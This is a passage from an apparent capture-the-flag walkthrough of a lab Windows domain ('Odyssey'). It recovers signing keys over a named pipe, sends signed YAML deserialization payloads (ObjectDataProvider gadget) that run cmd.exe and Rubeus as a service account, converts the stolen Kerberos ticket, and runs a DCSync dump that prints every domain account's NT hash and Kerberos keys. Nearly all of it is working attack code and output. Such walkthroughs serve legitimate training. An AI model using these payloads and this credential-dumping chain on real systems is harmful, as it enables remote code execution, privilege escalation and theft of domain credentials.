[Array]::Copy($commandToken, 0, $concatBuffer, 0, $commandToken.Length)
[Array]::Copy($encryptedPackage, 0, $concatBuffer, $commandToken.Length, $encryptedPackage.Length)
$integrityTag = $macEngine.ComputeHash($concatBuffer)

$packetStream = New-Object IO.MemoryStream
$packetWriter = New-Object IO.BinaryWriter($packetStream)
$packetWriter.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$packetWriter.Write([int32]1)
$packetWriter.Write([int16]$commandToken.Length)
$packetWriter.Write($commandToken)
$packetWriter.Write([int32]$encryptedPackage.Length)
$packetWriter.Write($encryptedPackage)
$packetWriter.Write($integrityTag)
$packetWriter.Flush()

$channel = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$channel.Connect(5000)
$channel.Write($packetStream.ToArray(), 0, $packetStream.Length)
$channel.Flush()

$replyBuffer = New-Object byte[] 131072
$bytesReceived = $channel.Read($replyBuffer, 0, 131072)
$channel.Dispose()

$respCmdLen = [BitConverter]::ToUInt16($replyBuffer, 8)
$respCmd = [Text.Encoding]::UTF8.GetString($replyBuffer, 10, $respCmdLen)
$respDataLen = [BitConverter]::ToInt32($replyBuffer, 10 + $respCmdLen)
$unwrappedKey = New-Object byte[] $respDataLen
[Array]::Copy($replyBuffer, 14 + $respCmdLen, $unwrappedKey, 0, $respDataLen)

[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/wrapper.bin', $unwrappedKey)
Write-Host ("Recovered material (hex): " + [BitConverter]::ToString($unwrappedKey).Replace('-', '').ToLower())
```

```powershell
*Evil-WinRM* PS C:\programdata> .\telemetry_unwrap.ps1
Recovered material (hex): d5742ed26151833792ffd2d821959e0f1b85a1f922157639a6c7ec90c094d658
```

The recovered 32-byte value is the AES-GCM master key that protects operator.key.enc. Decrypting it offline yields the final HMAC signing key used by the management protocol:

```powershell
*Evil-WinRM* PS C:\programdata\AegisStream\keys> ls


    Directory: C:\programdata\AegisStream\keys


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2026  12:54 PM             32 auditor.key
-a----          5/8/2026  12:54 PM             32 operator.key
-a----          5/8/2026  12:54 PM             60 operator.key.enc
-a----          5/8/2026  12:54 PM             32 viewer.key
```

```python
# unwrap_key_material.py
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

master_secret = bytes.fromhex('d5742ed26151833792ffd2d821959e0f1b85a1f922157639a6c7ec90c094d658')
encrypted_blob = open('operator.key.enc', 'rb').read()

iv = encrypted_blob[:12]
auth_tag = encrypted_blob[12:28]
ciphertext = encrypted_blob[28:]

cipher = AESGCM(master_secret)
recovered = cipher.decrypt(iv, ciphertext + auth_tag, None)
print(f"operator key recovered -> {recovered.hex()}")
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ python3 unwrap_key_material.py
operator key recovered -> 4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c
```

### Remote Code Execution via YAML Deserialization as svc-aegis-stream

With a valid signing key, arbitrary commands can be sent to the service. The service deserializes the YAML body of a `CONFIG_IMPORT` packet using .NET’s `ObjectDataProvider`, which is a well-known gadget for remote code execution. Three successive payloads were delivered:

1. A proof-of-concept that simply writes the current identity to a file.
2. A payload that copies `Rubeus.exe` into a location readable by the service account.
3. A payload that executes `Rubeus tgtdeleg` under the service’s security context, producing a usable TGT for `svc-aegis-stream`.

```powershell
# ImportConfig.ps1
$keyMaterialHex = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$signingKey = [byte[]]::new(32)
for ($idx = 0; $idx -lt 32; $idx++) {
    $signingKey[$idx] = [Convert]::ToByte($keyMaterialHex.Substring($idx*2, 2), 16)
}

$newline = [char]10
$yamlDoc = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $newline +
        "ObjectInstance:" + $newline +
        "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $newline +
        "  StartInfo:" + $newline +
        "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $newline +
        "    FileName: cmd.exe" + $newline +
        "    Arguments: '/c whoami > C:\ProgramData\AegisStream\logs\rce.txt'" + $newline +
        "MethodName: Start"

$bodyBytes  = [Text.Encoding]::UTF8.GetBytes($yamlDoc)
$opcodeName = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')

$macProvider = New-Object System.Security.Cryptography.HMACSHA256(,$signingKey)
$combined = New-Object byte[] ($opcodeName.Length + $bodyBytes.Length)
[Array]::Copy($opcodeName, 0, $combined, 0, $opcodeName.Length)
[Array]::Copy($bodyBytes, 0, $combined, $opcodeName.Length, $bodyBytes.Length)
$macTag = $macProvider.ComputeHash($combined)

$outStream = New-Object IO.MemoryStream
$writer = New-Object IO.BinaryWriter($outStream)
$writer.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$writer.Write([int32]1)
$writer.Write([int16]$opcodeName.Length); $writer.Write($opcodeName)
$writer.Write([int32]$bodyBytes.Length); $writer.Write($bodyBytes)
$writer.Write($macTag); $writer.Flush()

$pipeLink = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipeLink.Connect(5000)
$pipeLink.Write($outStream.ToArray(), 0, $outStream.Length); $pipeLink.Flush()

$rxBuffer = New-Object byte[] 131072
$bytesRead = $pipeLink.Read($rxBuffer, 0, 131072); $pipeLink.Dispose()

$respOpLen  = [BitConverter]::ToUInt16($rxBuffer, 8)
$respOpCode = [Text.Encoding]::UTF8.GetString($rxBuffer, 10, $respOpLen)
$respPlLen  = [BitConverter]::ToInt32($rxBuffer, 10 + $respOpLen)

Write-Output "[*] Server Response -> Opcode: $respOpCode | Body Size: $respPlLen"
```

```powershell
*Evil-WinRM* PS C:\programdata> .\ImportConfig.ps1
[*] Server Response -> Opcode: OK | Body Size: 0
```

```powershell
# CopyBinary.ps1
$hexSeed = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$keyBytes = [byte[]]::new(32)
for ($pos = 0; $pos -lt 32; $pos++) {
    $keyBytes[$pos] = [Convert]::ToByte($hexSeed.Substring($pos*2, 2), 16)
}

$eol = [char]10
$doc = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $eol +
        "ObjectInstance:" + $eol +
        "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $eol +
        "  StartInfo:" + $eol +
        "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $eol +
        "    FileName: cmd.exe" + $eol +
        "    Arguments: '/c copy C:\ProgramData\Rubeus.exe C:\ProgramData\AegisStream\Rubeus.exe'" + $eol +
        "MethodName: Start"

$body = [Text.Encoding]::UTF8.GetBytes($doc)
$opStr = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')

$signer = New-Object System.Security.Cryptography.HMACSHA256(,$keyBytes)
$toSign = New-Object byte[] ($opStr.Length + $body.Length)
[Array]::Copy($opStr, 0, $toSign, 0, $opStr.Length)
[Array]::Copy($body, 0, $toSign, $opStr.Length, $body.Length)
$tag = $signer.ComputeHash($toSign)

$mem = New-Object IO.MemoryStream
$bin = New-Object IO.BinaryWriter($mem)
$bin.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bin.Write([int32]1)
$bin.Write([int16]$opStr.Length); $bin.Write($opStr)
$bin.Write([int32]$body.Length); $bin.Write($body)
$bin.Write($tag); $bin.Flush()

$conn = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$conn.Connect(5000)
$conn.Write($mem.ToArray(), 0, $mem.Length); $conn.Flush()

$rx = New-Object byte[] 131072
$got = $conn.Read($rx, 0, 131072); $conn.Dispose()

$len1  = [BitConverter]::ToUInt16($rx, 8)
$opRcv = [Text.Encoding]::UTF8.GetString($rx, 10, $len1)
$len2  = [BitConverter]::ToInt32($rx, 10 + $len1)

Write-Output "[+] Copy task finished -> Code: $opRcv | Bytes: $len2"
```

```powershell
# DelegatedTicket.ps1
$hexSeed = "4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c"
$keyBytes = [byte[]]::new(32)
for ($pos = 0; $pos -lt 32; $pos++) {
    $keyBytes[$pos] = [Convert]::ToByte($hexSeed.Substring($pos*2, 2), 16)
}

$eol = [char]10
$doc = "--- !System.Windows.Data.ObjectDataProvider%2CPresentationFramework" + $eol +
        "ObjectInstance:" + $eol +
        "  !System.Diagnostics.Process%2CSystem.Diagnostics.Process" + $eol +
        "  StartInfo:" + $eol +
        "    !System.Diagnostics.ProcessStartInfo%2CSystem.Diagnostics.Process" + $eol +
        "    FileName: cmd.exe" + $eol +
        "    Arguments: '/c C:\ProgramData\AegisStream\Rubeus.exe tgtdeleg /nowrap > C:\ProgramData\AegisStream\logs\rubeus_out.txt 2>&1'" + $eol +
        "MethodName: Start"

$body = [Text.Encoding]::UTF8.GetBytes($doc)
$opStr = [Text.Encoding]::UTF8.GetBytes('CONFIG_IMPORT')

$signer = New-Object System.Security.Cryptography.HMACSHA256(,$keyBytes)
$toSign = New-Object byte[] ($opStr.Length + $body.Length)
[Array]::Copy($opStr, 0, $toSign, 0, $opStr.Length)
[Array]::Copy($body, 0, $toSign, $opStr.Length, $body.Length)
$tag = $signer.ComputeHash($toSign)

$mem = New-Object IO.MemoryStream
$bin = New-Object IO.BinaryWriter($mem)
$bin.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bin.Write([int32]1)
$bin.Write([int16]$opStr.Length); $bin.Write($opStr)
$bin.Write([int32]$body.Length); $bin.Write($body)
$bin.Write($tag); $bin.Flush()

$conn = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::None,
    [System.Security.Principal.TokenImpersonationLevel]::Identification)
$conn.Connect(5000)
$conn.Write($mem.ToArray(), 0, $mem.Length); $conn.Flush()

$rx = New-Object byte[] 131072
$got = $conn.Read($rx, 0, 131072); $conn.Dispose()

$len1  = [BitConverter]::ToUInt16($rx, 8)
$opRcv = [Text.Encoding]::UTF8.GetString($rx, 10, $len1)
$len2  = [BitConverter]::ToInt32($rx, 10 + $len1)

Write-Output "[+] Delegation task finished -> Code: $opRcv | Bytes: $len2"
```

```powershell
*Evil-WinRM* PS C:\programdata> icacls .\Rubeus.exe /grant Everyone:RX
processed file: .\Rubeus.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\programdata> icacls . /grant Everyone:RX
Successfully processed 0 files; Failed processing 1 files
icacls.exe : .: Access is denied.
    + CategoryInfo          : NotSpecified: (.: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

```powershell
*Evil-WinRM* PS C:\programdata> .\CopyBinary.ps1
[+] Copy task finished -> Code: OK | Bytes: 0
*Evil-WinRM* PS C:\programdata> .\DelegatedTicket.ps1
[+] Delegation task finished -> Code: OK | Bytes: 0
```

```powershell
*Evil-WinRM* PS C:\programdata\AegisStream\logs> cat rubeus_out.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.odyssey.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: vZTr6V9nSPh7CSrAMGZABhpMiyRHjiAUcUpBV9aCHg0=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      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
```

# Obtaining Domain Administrator Access Through DCSync
The resulting base64 Kirbi ticket was extracted from the log file, converted to ccache format, and used to perform a DCSync attack:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ echo "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" | base64 -d > aegis_stream.kirbi
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ impacket-ticketConverter aegis_stream.kirbi aegis-stream.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ export KRB5CCNAME=aegis-stream.ccache 
                                                                                                                 
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ impacket-secretsdump svc-aegis-stream@DC01.ODYSSEY.HTB -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:890b9e96245f6895e06adfe92ad1e81f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:409406365e91ed7118784646ba722b18:::
odyssey.htb\svc-mssql:1604:aad3b435b51404eeaad3b435b51404ee:f98c84bc6a119e2db8803fca2f806bbf:::
odyssey.htb\svc-aegis-build:6101:aad3b435b51404eeaad3b435b51404ee:bbc270509ec878cf516d5295fb4d774d:::
odyssey.htb\svc-aegis-deploy:7101:aad3b435b51404eeaad3b435b51404ee:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa:::
odyssey.htb\svc-aegis-stream:7601:aad3b435b51404eeaad3b435b51404ee:6dfcc37414166066010370e9612dcbc9:::
odyssey.htb\svc-aegis-watch:7602:aad3b435b51404eeaad3b435b51404ee:645bac8e7f4f20156ed4eeeb722a3532:::
odyssey.htb\ao-mreyes:7603:aad3b435b51404eeaad3b435b51404ee:ce35f6ee6040b23ee4f15727f16cce9b:::
odyssey.htb\ao-jchen:7604:aad3b435b51404eeaad3b435b51404ee:3c87138c24957b45098b3c2f09bc3fe7:::
odyssey.htb\ao-tnemec:7605:aad3b435b51404eeaad3b435b51404ee:7cd483b6b06182d2e2a99baba86b2907:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:731f1ff722ecd08160790d0ed5702fa9:::
ODYSSEY-DB$:1603:aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d:::
pipeline-cert-cache$:6102:aad3b435b51404eeaad3b435b51404ee:3ebbe83c9331345702c1dad93be0d968:::
[*] Kerberos keys grabbed
Administrator:0x14:20f853686ee6d27eb4c2de2ad458c55d4439aa34129c30200c7a1354ef2f8e87
Administrator:0x13:e6c1e3fba130bc774b92e8582b901b42
Administrator:aes256-cts-hmac-sha1-96:833eee83cef65c0632032a9c50e356480d50ca7ceef307a2b319f98d4a64e8df
Administrator:aes128-cts-hmac-sha1-96:9239845e853afec6ab20539394c5dc92
Administrator:0x17:890b9e96245f6895e06adfe92ad1e81f
krbtgt:aes256-cts-hmac-sha1-96:f64bb284f792d5dd417c2dcf86fb3d5627418afbe20d1b46a568076f371abcdb
krbtgt:aes128-cts-hmac-sha1-96:c34c99b19432aac8665e243367cf3446
krbtgt:0x17:409406365e91ed7118784646ba722b18
odyssey.htb\svc-mssql:0x14:fb28f1f63597fea4377c8347988431e34c83056344c1478b49145c17fdcc4b9b
odyssey.htb\svc-mssql:0x13:b61cbd3570a105791f40978e8fea9091
odyssey.htb\svc-mssql:aes256-cts-hmac-sha1-96:808e78d748ea0dcdcfe8ced4881b9a5b413692ff96fbef6812f05a3461cba070
odyssey.htb\svc-mssql:aes128-cts-hmac-sha1-96:954e86610a2f639740a5eca67a44b98f
odyssey.htb\svc-mssql:0x17:f98c84bc6a119e2db8803fca2f806bbf
odyssey.htb\svc-aegis-build:0x14:d91fb40ce6c1b2502dfd350d50d9818c7bbb42a4ae0b1306502b53f8eece20cf
odyssey.htb\svc-aegis-build:0x13:d7e5e10520b9a81220c484b250e9e551
odyssey.htb\svc-aegis-build:aes256-cts-hmac-sha1-96:966a5fa5b30c6127e9f2439f6039e0689c412551d7e44c30524a500587d00eb8
odyssey.htb\svc-aegis-build:aes128-cts-hmac-sha1-96:7b5369f03993feadbc3ef678c346c1c3
odyssey.htb\svc-aegis-build:0x17:bbc270509ec878cf516d5295fb4d774d
odyssey.htb\svc-aegis-deploy:0x14:fc3b3d10ab89755ce8fb233f29a44762c454a21599c85474e295f6358f79148c
odyssey.htb\svc-aegis-deploy:0x13:8c1e06c5799f94b3423ed13229d47364
odyssey.htb\svc-aegis-deploy:aes256-cts-hmac-sha1-96:19556b173f12bc149c69c2b51252fb588158afce8c418b3da5ed4830825e1b72
odyssey.htb\svc-aegis-deploy:aes128-cts-hmac-sha1-96:a7aedeccf74853b2edd49ec18e96150d
odyssey.htb\svc-aegis-deploy:0x17:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
odyssey.htb\svc-aegis-stream:0x14:ade514ea356a50cd8f1bbb49859d2a1dd4d8a79b138da0c90453ea534504d299
odyssey.htb\svc-aegis-stream:0x13:c501d815f91c1f4b616f765afcf89afc
odyssey.htb\svc-aegis-stream:aes256-cts-hmac-sha1-96:de6716abd9b2dbdee498be2e40b73fdad9918fc4cba9cb41d480899d28561de3
odyssey.htb\svc-aegis-stream:aes128-cts-hmac-sha1-96:34475614e192b3ec66e7913e8d183767
odyssey.htb\svc-aegis-stream:0x17:6dfcc37414166066010370e9612dcbc9
odyssey.htb\svc-aegis-watch:0x14:fed0ca8632a8fa1126cc3b0f3115751f2831c8973a1b0e62d1f48683576818b0
odyssey.htb\svc-aegis-watch:0x13:ffed972222c376fb0493e2a860ed5915
odyssey.htb\svc-aegis-watch:aes256-cts-hmac-sha1-96:68269cf8d02ad539c0811cce56064b8f09f9eec44881c5fc41d45c1a9e0c5cff
odyssey.htb\svc-aegis-watch:aes128-cts-hmac-sha1-96:bbfb7c8250337640747517fdc9786bda
odyssey.htb\svc-aegis-watch:0x17:645bac8e7f4f20156ed4eeeb722a3532
odyssey.htb\ao-mreyes:0x14:b3cac36f0eae7ecf9505cbce3342476c0733b6ccea96a7e12bc82abf316f9fe5
odyssey.htb\ao-mreyes:0x13:6a9ff04fe95614c04d0d695a86a3fcb5
odyssey.htb\ao-mreyes:aes256-cts-hmac-sha1-96:85127d4ccecfdf407fadb54ba36f5b46a1ecbab398633f9932a5d7a3b952f737
odyssey.htb\ao-mreyes:aes128-cts-hmac-sha1-96:b97abf050e6a73ff6115cdd1b445d33b
odyssey.htb\ao-mreyes:0x17:ce35f6ee6040b23ee4f15727f16cce9b
odyssey.htb\ao-jchen:0x14:453265808c8841f492e70944bd7bdc8209f27a91d42d09a76eee54f9f8e66c54
odyssey.htb\ao-jchen:0x13:8cd77b3de52ae6d7c16957a1c5e751bb
odyssey.htb\ao-jchen:aes256-cts-hmac-sha1-96:e54362b0330d24309343bc4ab8b5af917216861f5003b08172bdaafab5bc24af
odyssey.htb\ao-jchen:aes128-cts-hmac-sha1-96:14f15a8facc7c27a2efba5919ff09d37
odyssey.htb\ao-jchen:0x17:3c87138c24957b45098b3c2f09bc3fe7
odyssey.htb\ao-tnemec:0x14:e60b32620e6e6203d653369750be22e4b930181a84948c03c8bc09619bcf5e3e
odyssey.htb\ao-tnemec:0x13:65ff130e9e017cd5fb2293f8afd12528
odyssey.htb\ao-tnemec:aes256-cts-hmac-sha1-96:e9f9abb512f2338aa3dd9e4621085d1a1de016dd381ef00fe88ca716c1f9246d
odyssey.htb\ao-tnemec:aes128-cts-hmac-sha1-96:12609285f3129ef5e05299281856562a
odyssey.htb\ao-tnemec:0x17:7cd483b6b06182d2e2a99baba86b2907
DC01$:aes256-cts-hmac-sha1-96:cc835254e62488915f25fc98b4de713f9ea1e1c2a6f93d9cb51191d9f3e6e974
DC01$:aes128-cts-hmac-sha1-96:b46438bcf4c3dbe5990de94a1b617e9d
DC01$:0x17:731f1ff722ecd08160790d0ed5702fa9
ODYSSEY-DB$:0x14:f8b9cb6e518c3f15df4fd01d01f9c6772a56837d7f10832f0bd1d346a60affc2
ODYSSEY-DB$:0x13:db4dd52c945508b6f48208283ed9f548
ODYSSEY-DB$:aes256-cts-hmac-sha1-96:aaff0ce627d9bb964d1ab0bf189a3956673c4ab2dbdc2768766a90708e1d242c
ODYSSEY-DB$:aes128-cts-hmac-sha1-96:bde72605dccc9c3dc31b4b697a3fbb9d
ODYSSEY-DB$:0x17:71bc6be8565f0c9871070c3912b1680d
pipeline-cert-cache$:0x14:09e2dccc24ab751a50c2c7a30c223f0b6efeb50b2a005629b0d985fa3270a4cb
pipeline-cert-cache$:0x13:bb0a9633c309c1697f04f3754f8c621c
pipeline-cert-cache$:aes256-cts-hmac-sha1-96:712cf44c08fbb9184c5ac66768c1cef7f9f3d84d9b0c71751da10dbe31e360f0
pipeline-cert-cache$:aes128-cts-hmac-sha1-96:8cae53068845372feb9a57e0f7c02a78
pipeline-cert-cache$:0x17:3ebbe83c9331345702c1dad93be0d968
[*] Cleaning up...
```

The dump returned every domain account’s NT hash, including the Domain Administrator! Finally an interactive shell was obtained as Domain Admin and the root flag was recovered:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
